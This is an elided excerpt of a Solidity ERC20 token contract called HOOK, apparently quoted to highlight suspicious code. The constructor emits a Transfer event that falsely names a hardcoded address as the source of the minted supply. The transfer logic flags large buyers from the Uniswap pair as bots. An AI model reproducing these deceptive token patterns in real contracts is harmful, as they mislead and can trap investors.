...
contract HOOK is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        tokenOnwer = payable(address(0x6CD92275F9fbC4F6f637F9ABFAcA1772517D6c73));

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0x6CD92275F9fbC4F6f637F9ABFAcA1772517D6c73), _msgSender(), _totalSupply);
    }
    ...
    function _transfer(address from, address to, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if(from == uniswapPair) {
                    if (amount > 20000000 * 10**_decimals) {                  
                        addBot(to);
                    }
                }
